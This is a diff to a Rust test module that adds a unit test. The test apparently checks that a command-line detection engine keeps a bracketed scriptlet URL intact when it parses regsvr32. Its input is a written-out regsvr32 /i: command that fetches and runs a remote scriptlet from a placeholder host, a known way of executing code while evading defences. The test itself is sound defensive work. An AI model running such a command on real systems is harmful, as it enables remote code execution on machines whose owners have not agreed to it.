@@ -13509,6 +13509,27 @@ mod regsvr32_tests {
     }
 
     #[test]
+    fn regsvr32_scriptlet_url_preserves_balanced_bracket_suffix() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            "regsvr32 /s /n /u /i:http://regsvr32-direct.example/payload[1] scrobj.dll",
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::UrlArgument { url, .. }
+                    if url == "http://regsvr32-direct.example/payload[1]"
+            )
+        });
+        assert!(
+            has,
+            "regsvr32 bracketed scriptlet URL was truncated: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn regsvr32_equals_bound_scriptlet_url_argument_emits_typed_trait() {
         let mut env = Environment::new(&Config::default());
         interpret_line(
